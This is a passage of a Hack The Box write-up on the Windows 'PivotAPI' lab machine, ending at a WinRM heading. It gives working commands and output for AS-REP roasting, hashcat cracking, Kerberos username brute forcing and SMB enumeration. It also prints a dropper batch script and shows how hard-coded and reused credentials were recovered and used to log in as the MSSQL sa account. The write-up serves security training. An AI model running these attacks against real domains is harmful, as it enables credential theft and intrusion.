---
title: HTB: PivotAPI
url: https://0xdf.gitlab.io/2021/11/06/htb-pivotapi.html
date: 2021-11-06T13:45:00+00:00
difficulty: Insane [50]
os: Windows
tags: ctf, hackthebox, htb-pivotapi, nmap, windows, active-directory, exiftool, as-rep-roast, getuserspns, hashcat, mssql, mssqlclient, bloodhound, smbmap, smbclient, mbox, mutt, msgconvert, reverse-engineering, procmon, vbs, api-monitor, crackmapexec, mssql-shell, mssqlproxy, evil-winrm, keepass, genericall, powersploit, powerview, tunnel, dotnet, dnspy, forcechangepassword, laps, winpeas, powershell-run-as, cyberchef, seimpersonate, printspoofer, htb-safe, oscp-plus-v2, osep-plus
---

![PivotAPI](https://0xdfimages.gitlab.io/img/pivotapi-cover.png)

PivotAPI had so many steps. It starts and ends with Active Directory attacks, first finding a username in a PDF metadata and using that to AS-REP Roast. This user has access to some binaries related to managing a database. I’ll reverse them mostly with dynamic analysis to find the password through several layers of obfuscation, eventually gaining access to the MSSQL service. From there, I’ll use mssqlproxy to tunnel WinRM through the DB, where I find a KeePass DB. Those creds give SSH access, where I’ll then pivot through some vulnerable privileges to get access to a developers share. In there, another binary that I can use to fetch additional creds. Finally, after another pivot through misconfigured privileges, I’ll get access to the LAPS password for the administrator. In Beyond Root, I’ll show some unintended paths.

## Box Info

| Name | [PivotAPI](https://hackthebox.com/machines/pivotapi)  [PivotAPI](https://hackthebox.com/machines/pivotapi) [Play on HackTheBox](https://hackthebox.com/machines/pivotapi) |
| --- | --- |
| Release Date | [08 May 2021](https://twitter.com/hackthebox_eu/status/1389958575070515206) |
| Retire Date | 06 Nov 2021 |
| OS | Windows Windows |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for PivotAPI |
| Radar Graph | Radar chart for PivotAPI |
| First Blood User | 02:00:14[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| First Blood Root | 02:19:56[xct xct](https://app.hackthebox.com/users/13569) |
| Creators | [CyberVaca CyberVaca](https://app.hackthebox.com/users/6956)  [3v4Si0N 3v4Si0N](https://app.hackthebox.com/users/1979) |

## Recon

### nmap

`nmap` found a bunch open TCP ports:

```

oxdf@parrot$ sudo nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.240
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 16:28 EDT
Nmap scan report for 10.10.10.240
Host is up (0.098s latency).
Not shown: 65514 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49673/tcp open  unknown
49697/tcp open  unknown
49782/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.53 seconds
oxdf@parrot$ sudo nmap -p 21,22,53,88,135,139,389,445,464,593,636,1433,3268,3269,9389 -sCV -oA scans/nmap-tcpscripts 10.10.10.240
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 16:30 EDT
Nmap scan report for 10.10.10.240
Host is up (0.090s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-19-21  03:06PM               103106 10.1.1.414.6453.pdf
| 02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf
| 02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
| 02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf
| 08-08-20  01:18PM               219091 notes1.pdf
| 08-08-20  01:34PM               279445 notes2.pdf
| 08-08-20  01:41PM                  105 README.txt
|_02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   3072 fa:19:bb:8d:b6:b6:fb:97:7e:17:80:f5:df:fd:7f:d2 (RSA)
|   256 44:d0:8b:cc:0a:4e:cd:2b:de:e8:3a:6e:ae:65:dc:10 (ECDSA)
|_  256 93:bd:b6:e2:36:ce:72:45:6c:1d:46:60:dd:08:6a:44 (ED25519)
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-04-29 20:30:13Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: LICORDEBELLOTA
|   NetBIOS_Domain_Name: LICORDEBELLOTA
|   NetBIOS_Computer_Name: PIVOTAPI
|   DNS_Domain_Name: LicorDeBellota.htb
|   DNS_Computer_Name: PivotAPI.LicorDeBellota.htb
|   DNS_Tree_Name: LicorDeBellota.htb
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-05-29T19:54:29
|_Not valid after:  2051-05-29T19:54:29
|_ssl-date: 2021-04-29T20:30:58+00:00; +3s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: PIVOTAPI; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 2s
| ms-sql-info: 
|   10.10.10.240:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-05-29T20:30:22
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.45 seconds

```

In addition to the standard [ports associated with a Windows Domain Controller](https://docs.microsoft.com/en-US/troubleshoot/windows-server/identity/config-firewall-for-ad-domains-and-trusts), there’s also FTP (TCP 21) and MSSQL (1433), as well as SSH (22) for access should I find credentials.

The scan results also show a domain name (`LicorDeBellota.htb`) and subdomain for this host (`PivotAPI.LicorDeBellota.htb`). I’ll add those to `/etc/hosts`.

FTP anonymous login is permitted.

### Dead Ends

Finding the foothold on this box was a bit tricky, and I did a bunch of enumeration that didn’t lead anywhere. Rather than show it all (all things I’ve shown before), I’ll just list some of it here:
- No anonymous access to SMB (TCP 445).
- `rpcclient` will connect but any queries return `NT_STATUS_ACCESS_DENIED` (TCP 445).
- Unable to zone transfer for the domain using DNS (TCP 53).
- Brute forcing of usernames on Kerberos (TCP 88) using the following command actually did provide two users, jari and administrator: `kerbrute userenum --domain LicorDeBellota.htb --dc 10.10.10.12 /opt/SecLists/Usernames/xato-net-10-million-usernames.txt`. But without creds, I couldn’t get anything useful from that. I did try an AS-REP-roast for Jari, but the `UF_DONT_REQUIRE_PREAUTH` flag was not set.
- Nothing to do without creds for SSH (TCP 22) and MSSQL (TCP 1433).

### FTP - TCP 21

Anonymous login is enabled:

```

oxdf@parrot$ ftp 10.10.10.240
Connected to 10.10.10.240.
220 Microsoft FTP Service
Name (10.10.10.240:oxdf): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp>

```

On entering `ls`, it just hangs. I switch to passive mode, and it worked:

```

ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,10,10,240,208,31).
125 Data connection already open; Transfer starting.
02-19-21  03:06PM               103106 10.1.1.414.6453.pdf
02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf
02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf
08-08-20  01:18PM               219091 notes1.pdf
08-08-20  01:34PM               279445 notes2.pdf
08-08-20  01:41PM                  105 README.txt
02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
226 Transfer complete.

```

I’ll grab all the files:

```

ftp> bin
200 Type set to I.
ftp> prompt off
Interactive mode off.
ftp> mget *
...[snip]...

```

`README.txt` is just a reminder that I already followed:

```

VERY IMPORTANT!!
Don't forget to change the download mode to binary so that the files are not corrupted.

```

The PDFs are technical writeups, some of which are in Spanish. There’s nothing in the content that seems useful here. Looking at the metadata for each PDF, one has a `Publisher` field that contains the domain and a `Creator` field that looks like a username in PivotAPI (others have usernames, but not the domain):

```

oxdf@parrot$ exiftool notes2.pdf 
ExifTool Version Number         : 12.16
File Name                       : notes2.pdf
Directory                       : .
File Size                       : 273 KiB
File Modification Date/Time     : 2021:04:29 16:40:30-04:00
File Access Date/Time           : 2021:04:29 16:40:31-04:00
File Inode Change Date/Time     : 2021:04:29 16:40:30-04:00
File Permissions                : rwxrwx---
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 5
XMP Toolkit                     : Image::ExifTool 12.03
Creator                         : Kaorz
Publisher                       : LicorDeBellota.htb
Producer                        : cairo 1.10.2 (http://cairographics.org)

```

I’ll note the username, and that the domain matches what `nmap` identified.

## Authentication as kaorz

### AS-REP Roast

With a username, I can do an AS-REP Roast attack, checking to see if the user happens to have the `UF_DONT_REQUIRE_PREAUTH` flag set to true. This flag would allow me to start Kerberos authentication process for this user even though I am not authenticated to the domain, and in that process, I’ll get a hash I can break if the user has a weak password.

The tool to check for this flag is `GetNPUsers.py` from [Impacket](https://github.com/SecureAuthCorp/impacket) (I always add the `/usr/share/doc/python3-impacket/examples` directory to my path since I use so many of the scripts so regularly). It returns a ticket granting ticket (TGT) for karoz:

```

oxdf@parrot$ GetNPUsers.py -no-pass -dc-ip 10.10.10.240 LicorDeBellota.htb/Kaorz
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for Kaorz
$krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:7111a3a35da662853c5b4e1e59a6bfc4$5d82cf9eb99b0cb8f8272678fc50faf9649f254321c918477dc4efbdc42d91346d97440234e42642113df464229dcf89608fcacb6aba02f691b9fef1c1e5ba240c12678c28200f133c3d486616c9c8cb96759f8e1937f886b217c2cbf527f6080a5b271b57f4808cf471d6472e588142a1803162c0375603d86e3d16c6e7d63574f2d1f003418b7901761d461f945fb5395dce9976ae07771fa69cf970c9e12dd5d9267b67f0a2c0b0c637a5825b58b00ac633fd542a6d2b56afd7c5b0baed49470ba90829936ccd31da7fbef0da8c9767020a51ac16bd5574e752ee47ca0bc98f143df89edac8f61c92afcd99c28b7a444060e794fb373b

```

### Crack TGT

The format of the hash matches 18200 on [Hashcat’s example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes). I’ll save it to a file and run Hashcat, and after about a minute it returns the password “Roper4155”:

```

oxdf@parrot$ hashcat -m 18200 kaorz.tgt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...
...[snip]...
$krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:7111a3a35da662853c5b4e1e59a6bfc4$5d82cf9eb99b0cb8f8272678fc50faf9649f254321c918477dc4efbdc42d91346d97440234e42642113df464229dcf89608fcacb6aba02f691b9fef1c1e5ba240c12678c28200f133c3d486616c9c8cb96759f8e1937f886b217c2cbf527f6080a5b271b57f4808cf471d6472e588142a1803162c0375603d86e3d16c6e7d63574f2d1f003418b7901761d461f945fb5395dce9976ae07771fa69cf970c9e12dd5d9267b67f0a2c0b0c637a5825b58b00ac633fd542a6d2b56afd7c5b0baed49470ba90829936ccd31da7fbef0da8c9767020a51ac16bd5574e752ee47ca0bc98f143df89edac8f61c92afcd99c28b7a444060e794fb373b:Roper4155
...[snip]...

```

### Things Creds Didn’t Get

kaorz doesn’t have access to SSH:

```

oxdf@parrot$ sshpass -p Roper4155 ssh kaorz@10.10.10.240
Permission denied, please try again.

```

Kerberoast with this user returned nothing:

```

oxdf@parrot$ GetUserSPNs.py -dc-ip 10.10.10.240 LicorDeBellota.htb/Kaorz
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
No entries found!

```

This user can’t connect to the database either (error translates to “User login error”):

```

oxdf@parrot$ mssqlclient.py LicorDeBellota.htb/Kaorz:Roper4155@10.10.10.240 -windows-auth
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Encryption required, switching to TLS
[-] ERROR(PIVOTAPI\SQLEXPRESS): Line 1: Error de inicio de sesión del usuario 'LICORDEBELLOTA\Kaorz'.

```

I will note the Spanish error messages, which indicates the language of the machine is Spanish.

### BloodHound

#### Collect Data

Now that I have creds, BloodHound can get an understanding of the users / computers in the domain. From my VM, [BloodHound.py](https://github.com/fox-it/BloodHound.py) will collect this data:

```

oxdf@parrot$ bloodhound-python -c ALL -u kaorz -p Roper4155 -d licordebellota.htb -dc licordebellota.htb -ns 10.10.10.240
INFO: Found AD domain: licordebellota.htb
INFO: Connecting to LDAP server: licordebellota.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: licordebellota.htb
INFO: Found 27 users
INFO: Connecting to GC LDAP server: pivotapi.licordebellota.htb
INFO: Found 57 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: PivotAPI.LicorDeBellota.htb
INFO: Done in 00M 16S

```

Now I’ll run `neo4j start` to start the database and then open Bloodhound (`apt install bloodhound` to install), and click the “Upload Data” button to read in the four JSON files I generated.

#### Analysis

I’ll mark kaorz as owned, but they aren’t interesting. No Local Admin Right, Execution Rights, no Outbound Control Rights:

![image-20210212163342131](https://0xdfimages.gitlab.io/img/image-20210212163342131.png)

I didn’t see much useful here at this point. The domain has 26 users (Usuarios Del Dominio = Domain Users):

![image-20210429164955203](https://0xdfimages.gitlab.io/img/image-20210429164955203.png)

I’ll come back once I get some more users.

### SMB Access

These creds do provide SMB access to a few shares:

```

oxdf@parrot$ smbmap -H 10.10.10.240 -u kaorz -p Roper4155
[+] IP: 10.10.10.240:445        Name: pivotapi.licordebellota.htb                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        IPC$                                                    READ ONLY       IPC remota
        NETLOGON                                                READ ONLY       Recurso compartido del servidor de inicio de sesión 
        SYSVOL                                                  READ ONLY       Recurso compartido del servidor de inicio de sesión 

```

## Shell as svc\_mssql

### SMB Enumeration

#### Get Files

There’s nothing interesting in `SYSVOL`. The `NETLOGON` share has a `HelpDesk` folder with two email messages and an executable:

```

oxdf@parrot$ smbclient -U LicorDeBellota.htb/Kaorz //10.10.10.240/NETLOGON Roper4155
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug  8 06:42:28 2020
  ..                                  D        0  Sat Aug  8 06:42:28 2020
  HelpDesk                            D        0  Sun Aug  9 11:40:36 2020

                7779839 blocks of size 4096. 3513148 blocks available
smb: \> ls HelpDesk\
  .                                   D        0  Sun Aug  9 11:40:36 2020
  ..                                  D        0  Sun Aug  9 11:40:36 2020
  Restart-OracleService.exe           A  1854976  Fri Feb 19 05:52:01 2021
  Server MSSQL.msg                    A    24576  Sun Aug  9 07:04:14 2020
  WinRM Service.msg                   A    26112  Sun Aug  9 07:42:20 2020

                7779839 blocks of size 4096. 3513148 blocks available

```

I’ll grab all three:

```

smb: \HelpDesk\> prompt off
smb: \HelpDesk\> mget *
getting file \HelpDesk\Restart-OracleService.exe of size 1854976 as Restart-OracleService.exe (870.1 KiloBytes/sec) (average 870.1 KiloBytes/sec)
getting file \HelpDesk\Server MSSQL.msg of size 24576 as Server MSSQL.msg (64.5 KiloBytes/sec) (average 748.0 KiloBytes/sec)
getting file \HelpDesk\WinRM Service.msg of size 26112 as WinRM Service.msg (66.1 KiloBytes/sec) (average 655.3 KiloBytes/sec)

```

#### Convert Emails

These files are in an Outlook message format:

```

oxdf@parrot$ file Server\ MSSQL.msg
Server MSSQL.msg: CDFV2 Microsoft Outlook Message

```

[MSGConvert](https://www.matijs.net/software/msgconv/) will convert them to an ASCII format that I can read on a Linux system. To install, I had the best success with `sudo cpan -i Email::Outlook::Message`. It is in the repos as well under `apt install libemail-outlook-message-perl`, but that didn’t work for me.

Now I’ll run `sudo msgconvert [msg file]`, and it will create `.eml` files for each input.

```

oxdf@parrot$ msgconvert *.msg

```

The resulting files can be read as is, but I can also put them in a mailbox and open them with a viewer like `mutt` using `formail` (`apt install procmail`):

```

oxdf@parrot$ formail -b < Server\ MSSQL.eml > pivot.mbox
oxdf@parrot$ formail -b < WinRM\ Service.eml >> pivot.mbox
oxdf@parrot$ mutt -Rf pivot.mbox # -R read only, -f open file

```

This opens Mutt. I’ll tell it not to create a mailbox for me, and then it drops me at the two messages:

![image-20210212105835607](https://0xdfimages.gitlab.io/img/image-20210212105835607.png)

#### Email Contents

“Server MSSQL” talks about the migration from Oracle to MSSQL at the start of 2020:

> Date: Sun, 09 Aug 2020 11:04:14 +0000
> To: “cybervaca@licordebellota.htb” <cybervaca@licordebellota.htb>
> Subject: Server MSSQL
>
> Good afternoon,
>
> Due to the problems caused by the Oracle database installed in 2010
> in Windows, it has been decided to migrate to MSSQL at the beginning
> of 2020.
>
> Remember that there were problems at the time of restarting the
> Oracle service and for this reason a program called
> “Reset-Service.exe” was created to log in to Oracle and restart the
> service.
>
> Any doubt do not hesitate to contact us.
>
> Greetings,
>
> The HelpDesk Team

I’ve got a copy of `Restart-OracleService.exe`, which is very similar to what’s in the note. It should have the Oracle creds in it.

The other message talks about the firewall:

> Date: Sun, 09 Aug 2020 11:42:20 +0000
> To: “helpdesk@licordebellota.htb” <helpdesk@licordebellota.htb>
> Subject: WinRM Service
>
> Good afternoon.
>
> After the last pentest, we have decided to stop externally displaying
> WinRM’s service. Several of our employees are the creators of
> Evil-WinRM so we do not want to expose this service… We have
> created a rule to block the exposure of the service and we have also
> blocked the TCP, UDP and even ICMP output (So that no shells of the
> type icmp are used.)
>
> Greetings,
>
> The HelpDesk Team

### Restart-OracleService Static Reversing

The file is a Windows 64-bit executable:

```

oxdf@parrot$ file Restart-OracleService.exe 
Restart-OracleService.exe: PE32+ executable (console) x86-64, for MS Windows

```

Running `strings` on it returned a bunch of junk, and one interesting one:

```

inflate 1.2.11 Copyright 1995-2017 Mark Adler 

```

This string comes from the [ZLib compression library](https://github.com/madler/zlib/blob/cacf7f1d4e3d44d871b605da3b647f07d718623f/inftrees.c#L12).

I opened the binary in [Ghidra](https://ghidra-sre.org/), but had no lucked getting oriented at all. There are no useful strings. The binary isn’t importing any libraries that might be used to interact with Oracle or the network in general. It appears to be heavily obfuscated in some way.

### Restart-OracleService Dynamic Reversing

#### Procmon Overview

Switching over to a windows VM, just running the binary returns nothing. I’ll fire up `procmon` from [Sys Internals](https://docs.microsoft.com/en-us/sysinternals/) and look at what it’s doing. Procmon will capture all registry, file, network, and process events for the entire Windows System, and allow the user to apply filters to see what is going on.

There’s a couple things to know when running Procmon. First, use the magnifying glass button to start and stop capture to focus on the events you’re looking at. For example, I’ll stop capture, clear the data, start capture, run my binary, wait a few seconds after it returns, and then stop capture. Obviously this risks missing events that crafty malware may do to start a new process and sleep for a while, but at least to start, it’s a useful strategy. These logs will pile up quick even on an idol Windows host, and trying to change filters on hours of data will be painfully slow.

Filters are powerful, and you have to remember what you have turned on. Filters can either hide or only show things that match. In the “Filter” –> “Filter…” menu, I can add a filter to look at events from the process I care about:

![image-20210212124906614](https://0xdfimages.gitlab.io/img/image-20210212124906614.png)

The exclude filters are there by default, and prevent a bunch of really loud windows stuff and Procmon stuff from showing up.

#### Collect on Restart-OracleService.exe

I’ll stop and clear Procmon, and then start it, and run `Restart-OracleService.exe` in a terminal. It returns without printing anything, and after a couple seconds, I stop the collection in Procmon.

There are 871 events over 0.287 seconds associated with this binary.

There’s a lot of start-up stuff at the top, so I like to start at the bottom. I see references to a `.bat` file in my local temp directory. I’ll apply another filter:

![image-20210212125833689](https://0xdfimages.gitlab.io/img/image-20210212125833689.png)

The results show two clusters of activity less than 0.1 seconds apart:

[![image-20210212125942210](https://0xdfimages.gitlab.io/img/image-20210212125942210.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210212125942210.png)

The first group writes to the file, and then the next group deletes it (`SetDispositionInformationEx`).

Turning off the filter for `.bat`, between those two clusters, there’s a process creation event on `cmd.exe`:

[![image-20210212130202462](https://0xdfimages.gitlab.io/img/image-20210212130202462.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210212130202462.png)

Double clicking on it gives access to the full command line:

```

"C:\Windows\sysnative\cmd" /c "C:\Users\0xdf\AppData\Local\Temp\521F.tmp\5220.tmp\5221.bat C:\Users\0xdf\Desktop\Restart-OracleService.exe"

```

It is trying to run the `.bat` file.

### bat File

#### Capture bat File

I’ll use an infinite loop in PowerShell to check for `.bat` files and copy it to the current directory:

```

PS > while($true) { ls -Path .\AppData\Local\Temp\*.tmp -recurse -filter *.bat | ForEach-Object { copy $_.fullname .\$_name ; echo $_.name }}

```

In another window, I’ll run the binary. Looks like it actually has time to copy it three times before the file is deleted:

```

PS > while($true) { ls -Path .\AppData\Local\Temp\*.tmp -recurse -filter *.bat | ForEach-Object { copy $_.fullname .\$_name ; echo $_.name }}
FEC2.bat
FEC2.bat
FEC2.bat

```

When doing this again later, it took several runs of the binary to get it to catch the bat file before it was removed, so your experience may very depending on the VM.

#### File Analysis

The file first checks if the current username is cybervaca, frankytech, or ev4si0n, and if it’s none of these, it goes to the `error` label, which is the last line of the script, effectively exiting:

```

@shift /0
@echo off

if %username% == cybervaca goto correcto
if %username% == frankytech goto correcto
if %username% == ev4si0n goto correcto

goto error

```

If it is one of these users, it dumbs base64-encoded text into `c:\programdata\oracle.txt`, then creates `c:\programdata\monta.ps1`, which will decode the base64 into `C:\ProgramData\restart-service.exe`. It calls `monta.ps1`, deletes the text file and the PowerShell script, calls the new exe, and then deletes it:

```

:correcto

echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
echo AAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5v >> c:\programdata\oracle.txt
echo dCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAAZIYJAAAAAAAAAAAA >> c:\programdata\oracle.txt
...[snip]...
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt

echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea.Replace(" ","")} ; [System.IO.File]::WriteAllBytes("C:\ProgramData\restart-service.exe",([System.Convert]::FromBase64String($salida))) > c:\programdata\monta.ps1
powershell.exe -exec bypass -file c:\programdata\monta.ps1
del c:\programdata\monta.ps1
del c:\programdata\oracle.txt
c:\programdata\restart-service.exe
del c:\programdata\restart-service.exe

:error

```

#### Modify and Run

I’ll save a copy of this `.bat` file and remove the user checks at the start, and the file deletes and running of `restart-service.exe` at the end so that it just dumps the base64 data into `oracle.txt`, creates `monta.ps1`, and runs `monta.ps1` creating `restart-service.exe`.

I’ll run it, and then the new files are in `c:\programdata\`:

```

PS > ls C:\ProgramData\

    Directory: C:\ProgramData

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
...[snip]...
-a----         5/21/2021  10:25 AM        1202440 oracle.txt
-a----         5/21/2021  10:26 AM         864768 restart-service.exe
-a----         5/21/2021  10:25 AM            273 monta.ps1

```

### restart-service.exe

#### Run It

Running this one does print out an ASCII art banner, and then returns:

```

PS > C:\ProgramData\restart-service.exe

    ____            __             __     ____                  __
   / __ \___  _____/ /_____ ______/ /_   / __ \_________ ______/ /__
  / /_/ / _ \/ ___/ __/ __ `/ ___/ __/  / / / / ___/ __ `/ ___/ / _ \
 / _, _/  __(__  ) /_/ /_/ / /  / /_   / /_/ / /  / /_/ / /__/ /  __/
/_/ |_|\___/____/\__/\__,_/_/   \__/   \____/_/   \__,_/\___/_/\___/

                                                 by @HelpDesk 2010

```

#### Static

I imported and analyzed the exe with Ghidra, but just like the last one, this binary doesn’t have a good way to get a handle as to where to start. It’s clearly obfuscated / packed like the parent was.

#### Procmon

This binary records 364 events over about six seconds. There’s a five second pause, and then it creates a new `WerFAult.exe` process, which is the Windows Error Reporting process, and it exits. I wasn’t able to get much else out of this.

#### API Monitor

In looking for something like `ltrace` or `strace` for Windows, I came across [this StackOverflow](https://stackoverflow.com/questions/3847745/systrace-for-windows) thread. I played with several of the solutions, but really liked [API Monitor](http://www.rohitab.com/apimonitor). The downside is you have to give it a list of APIs to monitor. I started by selecting a bunch and running it, but got back hundreds of thousands of entries.

I decided to take a smarter approach. When malware (or otherwise obfuscated Windows exes) want to hide what they are doing, they don’t import the functions they are going to call, but rather look them up by name using `GetProcAddress`. I used the “Find” option to select only that call:

![image-20210212161009304](https://0xdfimages.gitlab.io/img/image-20210212161009304.png)

I ran the process again, and this time got back 196 records. That’s a lot, but it’s something I can scroll through. At the bottom, something caught my eye:

[![image-20210421103039047](https://0xdfimages.gitlab.io/img/image-20210421103039047.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210421103039047.png)

`CreateProcessWithLogonW` will have creds associated with it! I selected that API from the list, and ran it again - one result:

[![image-20210421103147327](https://0xdfimages.gitlab.io/img/image-20210421103147327.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210421103147327.png)

In the Parameters window, I can see the full set:

[![image-20210421103240452](https://0xdfimages.gitlab.io/img/image-20210421103240452.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210421103240452.png)

Username: svc\_oracle Password: #oracle\_s3rV1c3!2010

### Gaining DB Access

Those creds aren’t valid on the domain:

```

oxdf@parrot$ crackmapexec smb 10.10.10.240 -u svc_oracle -p '#oracle_s3rV1c3!2010'
SMB         10.10.10.240    445    PIVOTAPI         [*] Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.240    445    PIVOTAPI         [-] LicorDeBellota.htb\svc_oracle:#oracle_s3rV1c3!2010 STATUS_LOGON_FAILURE 

```

In fact, that user isn’t in the Bloodhound data either:

```

oxdf@parrot$ grep -i svc_oracle bloodhound/users.json

```

Back into the Bloodhound data, I can look at the current users, and there is one with `svc` in it:

```

oxdf@parrot$ cat bloodhound/users.json | jq -r '.users[].Properties.name' | grep -i svc
SVC_MSSQL@LICORDEBELLOTA.HTB

```

The email said they migrated from a 2010 instance of Oracle to MSSQL at the start of 2020. Given the password for Oracle was centered on Oracle and included the year it was stood up, could they use the same password just updated for the service and the year? It worked!

```

oxdf@parrot$ crackmapexec smb 10.10.10.240 -u svc_mssql -p '#mssql_s3rV1c3!2020'
SMB         10.10.10.240    445    PIVOTAPI         [*] Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.240    445    PIVOTAPI         [+] LicorDeBellota.htb\svc_mssql:#mssql_s3rV1c3!2020 

```

Surprisingly, the creds don’t work to access the database:

```

oxdf@parrot$ mssqlclient.py 'LicorDeBellota.htb/svc_mssql:#mssql_s3rV1c3!2020@10.10.10.240'
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Encryption required, switching to TLS
[-] ERROR(PIVOTAPI\SQLEXPRESS): Line 1: Error de inicio de sesión del usuario 'svc_mssql'.

```

The default admin username for an MSSQL database is sa. I’ll try that, and it works:

```

oxdf@parrot$ mssqlclient.py 'sa:#mssql_s3rV1c3!2020@10.10.10.240'
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> 

```

Unfortunately, there’s nothing interesting in the database.

### WinRM

